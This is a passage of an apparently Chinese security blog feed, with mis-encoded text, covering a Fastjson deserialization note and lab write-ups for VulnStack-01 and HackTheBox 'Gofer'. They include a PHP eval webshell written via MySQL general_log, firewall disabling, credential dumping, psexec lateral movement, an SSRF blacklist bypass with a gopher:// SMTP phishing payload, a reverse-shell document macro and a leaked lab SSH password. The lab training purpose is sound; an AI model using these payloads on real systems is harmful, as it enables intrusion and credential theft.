class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><h3 id="4-è°ƒè¯•åˆ†ææ¼æ´"><a href="#4-è°ƒè¯•åˆ†ææ¼æ´" class="headerlink" title="4. è°ƒè¯•åˆ†ææ¼æ´"></a>4. è°ƒè¯•åˆ†ææ¼æ´</h3><p>debugä¸€ä¸‹çœ‹çœ‹å†…éƒ¨è¿è¡Œé€»è¾‘<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091127569.png" alt="image-20230809112714870"><br>æœ€ç»ˆä¼šåœ¨æ–­ç‚¹è¿™ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œå½“ç„¶å¦‚æœæƒ³è·Ÿçš„æ›´æ·±ä¹Ÿå¯ä»¥ç»§ç»­è¿›å…¥è¿™ä¸ªæ–¹æ³•è·Ÿ</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åˆ°è¿™é‡Œæ„Ÿè§‰è¿˜ä¸ç®—éš¾ï¼Œå°±æ˜¯åˆ©ç”¨@typeæŒ‡å®šç±»å»è‡ªåŠ¨æ‰§è¡Œæ„é€ å‡½æ•°å’Œ<code>setter</code>æˆ–è€…<code>getter</code>æ–¹æ³•</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">Javaååºåˆ—åŒ–Fastjsonç¯‡01-FastJsonåŸºç¡€ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/fastjson%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e1-%e5%9f%ba%e6%9c%ac%e5%8e%9f%e7%90%86/">Fastjsonååºåˆ—åŒ–æ¼æ´(1)â€”â€”åŸºæœ¬åŸç† â€“ JohnFrodâ€™s Blog</a><br><a href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack--01</title>
      <link href="/2023/08/VulnStack-01/"/>
      <url>/2023/08/VulnStack-01/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>win7éœ€è¦é€šå¤–ç½‘ï¼Œæ‰€ä»¥éœ€è¦ä¸¤å¼ ç½‘å¡ï¼Œç„¶åwin7éœ€è¦pingé€škaliã€win2003ã€win2008<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138708.png" alt="image-20230809113543512"><br>ç„¶åå¼€å¯win7çš„PHPstudyå°±è¡Œäº†ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªå¾ˆç–‘æƒ‘çš„ç‚¹å°±æ˜¯win7å¯ä»¥pingé€šå…¶å®ƒçš„æœºå™¨ï¼Œä½†æ˜¯åè¿‡æ¥å°±pingä¸é€šå¾ˆå¥‡æ€ªï¼Œè®¿é—®webæœåŠ¡åˆæ˜¯æ­£å¸¸çš„ã€‚ã€‚ã€‚</p><h2 id="å¤–ç½‘æ¸—é€"><a href="#å¤–ç½‘æ¸—é€" class="headerlink" title="å¤–ç½‘æ¸—é€"></a>å¤–ç½‘æ¸—é€</h2><p>nmapå…ˆæ‰«ä¸€æ³¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138114.png" alt="image-20230809113835029"><br>å¼€æ”¾äº†80å’Œ3306ç«¯å£ï¼Œå…ˆå»çœ‹çœ‹80ï¼Œæ˜¯ä¸€ä¸ªphpæ¢é’ˆï¼ŒMySQLæ£€æµ‹é‚£é‡Œç›´æ¥å°è¯•root&#x2F;rootè¿æ¥æˆåŠŸ<br>æ¥ç€ç›´æ¥è®¿é—®phpmyadminåˆ©ç”¨å¼±å£ä»¤ç™»å½•æˆåŠŸï¼Œç½‘ä¸Šçœ‹äº†çœ‹è¿™ä¸ªç‰ˆæœ¬å¯ä»¥åˆ©ç”¨æ—¥å¿—getshellï¼ŒæŸ¥çœ‹æ—¥å¿—æ˜¯å¦å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091138753.png" alt="image-20230809113854721"><br>æœªå¼€å¯ï¼Œé‚£ä¹ˆç›´æ¥å¼€å¯å®ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=on;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139731.png" alt="image-20230809113910701"><br>æ›´æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼Œåˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¸ªè·¯å¾„å°±è¡Œä»PHPæ¢é’ˆé‚£é‡Œå¾—åˆ°çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>ç„¶åå¾€æ—¥å¿—æ–‡ä»¶å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139044.png" alt="image-20230809113921993"><br>èšå‰‘è¿æ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139718.png" alt="image-20230809113933689"><br>æˆåŠŸè¿æ¥ï¼Œå¤–ç½‘ç»“æŸï¼Œç„¶åè¿™é‡Œé€šè¿‡yxcmsä¹Ÿæ˜¯å¯ä»¥getshell</p><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>æ²¡æ€ä¹ˆæ¥è§¦è¿‡å†…ç½‘å­¦ä¹ ä¸€ä¸‹ã€‚ã€‚ã€‚</p><h3 id="CSæ‹¿shell"><a href="#CSæ‹¿shell" class="headerlink" title="CSæ‹¿shell"></a>CSæ‹¿shell</h3><p>Windowsæ¸—é€è¿™é‡Œç›´æ¥ä¸Šçº¿csï¼Œç”±äºå·²ç»æœ‰äº†webçš„shellï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨powershellå½¢å¼çš„stagerç›´æ¥æ‰§è¡Œå‘½ä»¤å°±å¥½äº†ï¼Œç”±äºç¬¬ä¸€æ¬¡ä½¿ç”¨csæ‰€ä»¥åœ¨ä½¿ç”¨æ–¹æ³•è®°å½•è¯¦ç»†ç‚¹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139851.png" alt="image-20230809113943811"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091139908.png" alt="image-20230809113955865"><br>è¿™é‡Œä¸èƒ½ä½¿ç”¨x64payloadå¦åˆ™ä¼šå¤±è´¥ï¼Œç„¶åèšå‰‘æ‰§è¡Œç”Ÿæˆçš„payloadå³å¯æˆåŠŸä¸Šçº¿<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140898.png" alt="image-20230809114015844"><br>è¿™é‡Œç”±äºæ˜¯é¶æœºæ‰€ä»¥å¿ƒè·³æ—¶é—´ï¼ˆå¿ƒè·³æ—¶é—´æ˜¯æŒ‡ä¸Šçº¿çš„æœåŠ¡å™¨å’ŒcsæœåŠ¡å™¨çš„é€šä¿¡æ—¶é—´ï¼‰å³å›æ˜¾æ—¶é—´ç›´æ¥è®¾ç½®ä¸º0<br>ç„¶åæ‰§è¡Œsysteminfoè·å–ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼ŒCSçš„shellæ‰§è¡Œwinçš„å‘½ä»¤åªéœ€è¦åœ¨å‰é¢åŠ ä¸ªshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140271.png" alt="image-20230809114029205"></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091140937.png" alt="image-20230809114047888"><br>ç„¶åä¼šåˆ›å»ºä¸€ä¸ªç›‘å¬ï¼Œææƒæ–¹å¼éšä¾¿é€‰ä¸ª<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141658.png" alt="image-20230809114107629"><br>ç„¶åå°±ä¼šå‘ç°ä¸Šçº¿äº†ä¸€å°systemæƒé™çš„ä¸»æœº<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141714.png" alt="image-20230809114121677"><br>ç„¶åçœ‹ä¸‹CSä¸Šçš„ç‚«é…·ç•Œé¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141769.png" alt="image-20230809114129723"></p><h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><ol><li>é¦–å…ˆæŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh firewall show state</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091141622.png" alt="image-20230809114150570"><br>å…³é—­é˜²ç«å¢™</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142844.png" alt="image-20230809114221821"><br>2. å¸¸è§„ä¿¡æ¯æ”¶é›†<br>å½“å‰åŸŸå†…è®¡ç®—æœºåˆ—è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142196.png" alt="image-20230809114234166"><br>ä¸‰å°æœºå™¨ï¼ŒSTU1å°±æ˜¯win7ï¼Œå°†ç›®æ ‡åˆ—å‡º<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091142213.png" alt="image-20230809114246141"><br>æŠ“å–win7çš„æ˜æ–‡å¯†ç ï¼Œå¯ä»¥ç›´æ¥å³é”®æŠ“å–ï¼Œä¹Ÿå¯ä»¥å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143544.png" alt="image-20230809114315475"><br>ç„¶åæŸ¥çœ‹å¯†ç å‡­è¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143633.png" alt="image-20230809114332560"><br>åŸŸæ§åˆ—è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net dclist</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091143676.png" alt="image-20230809114351647"></p><h3 id="æ”»å‡»åŸŸæ§"><a href="#æ”»å‡»åŸŸæ§" class="headerlink" title="æ”»å‡»åŸŸæ§"></a>æ”»å‡»åŸŸæ§</h3><p>æ¨ªå‘psexecæ‹¿ä¸‹åŸŸæ§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144915.png" alt="image-20230809114404836"><br>ç”¨æˆ·å¯†ç é€‰æ‹©ä¸Šé¢æ‹¿åˆ°çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144015.png" alt="image-20230809114417979"><br>ç›‘å¬å™¨æ–°å»ºä¸€ä¸ªsmbç›‘å¬å™¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091144067.png" alt="image-20230809114440021"><br>ä¼šè¯é€‰æ‹©ä¸Šé¢çš„ä»»æ„ä¸€ä¸ª<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145752.png" alt="image-20230809114502711"><br>ç„¶åè¿è¡Œï¼Œä¸çŸ¥é“ä¸ºå•¥è¿™é‡Œæ”»å‡»å¤±è´¥äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145966.png" alt="image-20230809114514883"><br>çº¯çº¯æœ‰æ¯’ï¼Œåé¢æŠŠé¶æœºå¸äº†é‡è£…å¯ä»¥äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146720.png" alt="image-20230809114538195"><br>ç„¶ååŒæ ·æ–¹æ³•æ‹¿ä¸‹åŸŸæˆå‘˜ï¼Œè¿™æ¬¡çš„ä¼šè¯é€‰æ‹©æ–°ä¸Šçº¿çš„åŸŸæ§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091145015.png" alt="image-20230809114551973"><br>ä¸Šçº¿æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146993.png" alt="image-20230809114606935"><br>è‡³æ­¤æ‹¿ä¸‹åŸŸå†…æ‰€æœ‰æœºå™¨ï¼Œçœ‹çœ‹æ‹“æ‰‘å›¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091146474.png" alt="image-20230809114617416"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶æœºä¹Ÿå¯ä»¥åˆ©ç”¨å…¶å®ƒçš„æ¼æ´æ‹¿msfæ¥æ‰“ï¼Œè¿™é‡Œæˆ‘ä¸»è¦ä¸ºäº†å­¦ä¸‹CSæ‰€ä»¥å…¨ç¨‹å†…ç½‘ç”¨CSæ“ä½œï¼Œæ„Ÿè§‰æ‰“é¶æœºç¯å¢ƒå¾ˆå¤šæ—¶å€™æ€»æ˜¯å¥‡å¥‡æ€ªæ€ªï¼Œä¸€ä¼šå„¿è¡Œä¸€ä¼šå„¿ä¸è¡Œçš„ï¼Œå¦å¤–çœ‹é¶æœºä»‹ç»æœ‰ä¸ªç—•è¿¹æ¸…ç†ï¼Œä½†æ˜¯çœ‹äº†é‚£ä¹ˆå¤šwpå¥½åƒæ²¡æœ‰äººå†™</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HacktheBox--Gofer</title>
      <link href="/2023/08/HacktheBox-Gofer/"/>
      <url>/2023/08/HacktheBox-Gofer/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>nmapæ‰«æå¼€æ”¾ç«¯å£<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910548.png" alt="image-20230805191023390"><br>ç„¶åé…ç½®etc&#x2F;hosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.225 gofer.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>æ¥ç€è®¿é—®è¿™ä¸ªåŸŸåæ²¡å•¥å‘ç°ï¼Œç„¶åç”¨dirsearchåšäº†ä¸ªç›®å½•æ‰«æä¹Ÿæ²¡å‘ç°å•¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910168.png" alt="image-20230805191038098"><br>è¿™ä¸ªassetsçœ‹äº†ä¸‹æ²¡å•¥ä¸œè¥¿å°±å­˜æ”¾äº†äº›å‰ç«¯çš„ä¸€äº›é™æ€æ–‡ä»¶ï¼Œåˆ°è¿™é‡Œå®Œå…¨æ²¡æ€è·¯äº†ï¼ŒçŒœæµ‹é—®é¢˜å¯èƒ½å°±åœ¨ä¸‹é¢è¿™ä¸ªé‚®ç®±è¿™é‡Œï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051910792.png" alt="image-20230805191053738"><br>åé¢çœ‹äº†å®Œæ•´çš„è§†é¢‘æ•™ç¨‹ï¼Œç«Ÿç„¶æ˜¯é€šè¿‡é’“é±¼æ¥åå¼¹shellï¼Œå¹¶ä¸”åˆ©ç”¨smbclientè·å–åˆ°æç¤ºä¹‹å‰éƒ½ä¸çŸ¥é“è¿™ä¸ªæ–¹æ³•ï¼Œç¬¬ä¸€æ¬¡ç©hacktheboxçš„é¶æœºç¡®å®æƒ³ä¸åˆ°<br>å…¶å®è¿™é‡Œè¿˜æœ‰ä¸ªå­åŸŸåä½†æ˜¯dirsearchæ‰«ä¸åˆ°ï¼Œåº”è¯¥æ˜¯è‡ªå¸¦é‡Œé¢æ²¡æœ‰å°±æ˜¯<code>proxy.gofer.htb</code>å¯ä»¥é€šè¿‡ffufæ¥æ‰«ï¼Œè¿™ä¸ªå·¥å…·kaliè‡ªå¸¦äº†ï¼Œä½†æ˜¯é‚£ä¸ªå­—å…¸æŒ‡å®šæˆ‘æ²¡æ‰¾åˆ°è‡ªå¸¦çš„å­—å…¸ä½ç½®è¿™é‡Œå°±ä¸æ‰«æäº†å¤§æ¦‚å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://gofer.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -H &quot;Host:FUZZ.gofer.htb&quot;</span><br></pre></td></tr></table></figure><p>-wåé¢å°±æ˜¯ä½ è¦ä½¿ç”¨çš„å­—å…¸ï¼Œç„¶åæŠŠé‚£ä¸ªå­åŸŸååŠ åˆ°hostsä¸‹å†è®¿é—®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911125.png" alt="image-20230805191111085"><br>ç„¶åä¼šå‘ç°éœ€è¦ç™»å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911663.png" alt="image-20230805191125619"><br>å¼±å£ä»¤è¯•äº†ä¸€ä¸‹æ— æœï¼Œç›´æ¥æŠ“ä¸ªåŒ…çœ‹çœ‹ä¹Ÿæ²¡å‘ç°å•¥ï¼Œç„¶åè¿™é‡Œåˆ©ç”¨smbmapçœ‹ä¸€ä¸‹å…±äº«æ–‡ä»¶å•¥çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H gofer.htb</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051911946.png" alt="image-20230805191136897"><br>emmmï¼Œä¸çŸ¥é“è¿™ä¸ªç»ˆç«¯æ€ä¹ˆè®¾ç½®èƒ½è®©å®ƒä¸€è¡Œå±•ç¤ºå®Œä¸è‡ªåŠ¨æ¢è¡Œï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªåªè¯»çš„å…±äº«æ–‡ä»¶<br>åˆ©ç”¨smbclientè¿›å»çœ‹ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N  //gofer.htb/shares</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912926.png" alt="image-20230805191217866"><br>emmmï¼Œæ²¡æ€ä¹ˆç”¨è¿‡è¿™ä¸ªå·¥å…·ä¸å¤ªç†Ÿï¼Œé‡Œé¢æœ‰ä¸ª<code>.backup</code>æ–‡ä»¶å¤¹è¿›å»ä¹‹åå‘ç°è¿™ä¸ªé‡Œé¢æœ‰ä¸ªmailæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œå› ä¸ºæˆ‘æ˜¯ç”¨çš„rootå»ä½¿ç”¨çš„è¿™ä¸ªå·¥å…·æ‰€ä»¥è‡ªåŠ¨ä¸‹è½½åˆ°äº†rootæ–‡ä»¶å¤¹ï¼Œç„¶åæ‰“å¼€mailæ–‡ä»¶çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912727.png" alt="image-20230805191232665"><br>è¿™å°±ç›¸å½“äºä¸€ä¸ªæç¤ºäº†ï¼Œå¯ä»¥åˆ©ç”¨å®é’“é±¼ï¼Œä½†æ˜¯è¿™ä¸ªé‚®ç®±å‘é€åœ¨å†…éƒ¨æ‰€ä»¥å°±å¾—æƒ³åŠæ³•å‘é‚®ç®±äº†ï¼Œè¿™é‡Œåˆ©ç”¨ç‚¹æ˜¯ä¸Šé¢é‚£ä¸ªæ²¡å‘ç°å•¥ä¸œè¥¿çš„åŒ…ï¼Œç”¨POSTå‘åŒ…å¹¶ä¸”åŠ ä¸Šindex.php<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051912072.png" alt="image-20230805191247091"><br>å¯ä»¥çœ‹åˆ°ä¸å†æ˜¯401äº†ï¼Œå¹¶ä¸”è¿™é‡Œæç¤ºç¼ºå°‘ä¸ªurlå‚æ•°ï¼Œç»™å®ƒåŠ ä¸Šå¹¶ä¸”åŠ ä¸ªæœ¬åœ°åœ°å€<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913595.png" alt="image-20230805191319543"><br>å­˜åœ¨é»‘åå•ï¼Œé‚£ä¹ˆè¿™é‡Œåº”è¯¥å°±æ˜¯æœ‰ssrfäº†ï¼Œè¿™ä¸ªé»‘åå•å¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0x7f000001 </span><br><span class="line"></span><br><span class="line">https://highon.coffee/blog/ssrf-cheat-sheet/  //è¿™ä¸ªåœ°å€æä¾›äº†ä¸€äº›ç»•è¿‡æ–¹æ³•</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913551.png" alt="image-20230805191332496"><br>ç„¶åå‚è€ƒ<a href="https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2">ç½‘å€</a>åˆ©ç”¨gopheråè®®åœ¨25ç«¯å£è¿›è¡Œé‚®ä»¶å‘é€ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://0x7f000001:25/_HELO gofer.htb%0AMAIL FROM: &lt;root@y0n3er.com&gt;%0ARCPT TO: &lt;jhudson@gofer.htb&gt;%0ADATA%0ASubject: &lt;a http://10.10.14.19:7777/bad.odt&gt;SSRF HERE&lt;/a&gt;%0ASSRF AND SMTP%0A.</span><br><span class="line"></span><br><span class="line">urlç¼–ç ï¼š</span><br><span class="line">gopher://0x7f000001:25/_HELO%20gofer.htb%250AMAIL%20FROM:%20%3Croot@y0n3er.com%3E%250ARCPT%20TO:%20%3Cjhudson@gofer.htb%3E%250ADATA%250ASubject:%20%3Ca%20http://10.10.14.19:7777/bad.odt%3ESSRF%20HERE%3C/a%3E%250ASSRF%20AND%20SMTP%250A.</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadå°±æ˜¯å‘Jocelyn Hudsonç”¨æˆ·å‘äº†ä¸€ä¸ªé‚®ä»¶é€‰æ‹©è¿™ä¸ªç”¨æˆ·æ˜¯å› ä¸ºå‰é¢çš„é‚®ä»¶æç¤ºå¥¹çˆ±ç‚¹ä¸æ˜é‚®ä»¶ï¼Œè¿™ä¸ªé‡Œé¢æœ‰ä¸€ä¸ªæŒ‡å‘æ”»å‡»æœºçš„è¶…é“¾æ¥ï¼Œç„¶ååˆ©ç”¨å·¥å…·Libreofficeå…ˆéšä¾¿åˆ¶ä½œä¸€ä¸ª<code>bad.odt</code>æ–‡ä»¶ï¼Œç”Ÿæˆä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£å³ä¸ºodtæ ¼å¼ï¼Œç„¶åç”¨pythonèµ·ä¸ªæœåŠ¡å†å‘é€é‚®ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051913514.png" alt="image-20230805191353429"><br>å¯ä»¥çœ‹åˆ°é¶æœºåå°å°±ç‚¹äº†è¿™ä¸ªé‚®ä»¶</p><h2 id="åå¼¹shell-å®é’“é±¼"><a href="#åå¼¹shell-å®é’“é±¼" class="headerlink" title="åå¼¹shell (å®é’“é±¼)"></a>åå¼¹shell (å®é’“é±¼)</h2><p>é‚£ä¹ˆç°åœ¨å°±å¯ä»¥åŠ ä¸ªå®æ¥åå¼¹shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914755.png" alt="image-20230805191407695"><br>ç„¶ååœ¨ä½ å‡†å¤‡çš„<code>bad.odt</code>åŠ ä¸ªåå¼¹shellçš„å®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914057.png" alt="image-20230805191418015"><br>ä¿å­˜ä¹‹åè¿˜è¦åŠ ä¸ªæ‰“å¼€æ–‡ä»¶è¿è¡Œå®çš„è®¾ç½®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914258.png" alt="image-20230805191427211"><br>ç„¶åå†èµ·æœåŠ¡å‘é‚®ä»¶ï¼Œç¨ç­‰ä¸€ä¸‹æ‹¿åˆ°shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914991.png" alt="image-20230805191435903"><br>è¿™é‡Œæœ¬æ¥æƒ³åˆ©ç”¨pythonå¼„ä¸ªäº¤äº’å¼shellå‘ç°ä¸è¡Œï¼Œç„¶åå»jhudsonç›®å½•ä¸‹æ‰“å¼€user.txtæ‹¿åˆ°userçš„flag</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>é¦–å…ˆå°±æ˜¯ç”¨[pspy64](<a href="https://github.com/DominicBreuker/pspy">DominicBreuker&#x2F;pspy: Monitor linux processes without root permissions (github.com)</a>)è¿™ä¸ªè„šæœ¬å»ç›‘å¬åå°ä¸åŒç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ï¼Œå…ˆä¸Šä¼ åˆ°é¶æœºä¸Š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051914461.png" alt="image-20230805191455314"><br>ç»™å®ƒè¿è¡Œæƒé™ï¼Œç„¶åå»è¿è¡Œæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915157.png"><br>å‘ç°æ³„éœ²äº†ç”¨æˆ·tbuckleyçš„sshå¯†ç <code>tbuckley:ooP4dietie3o_hquaeti</code>ç™»ä¸Šå»çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tbuckley@gofer.htb</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå­˜åœ¨ä¸¤ä¸ªç”¨æˆ·ç»„ï¼Œæ‰¾ä¸€ä¸‹å±äºç¬¬äºŒä¸ªç»„çš„æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915974.png" alt="image-20230805191523914"><br>æ‰¾åˆ°äº†ä¸€ä¸ªnotesæ–‡ä»¶å±äºrootä½†æ˜¯devå…·æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰§è¡Œä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308051915306.png" 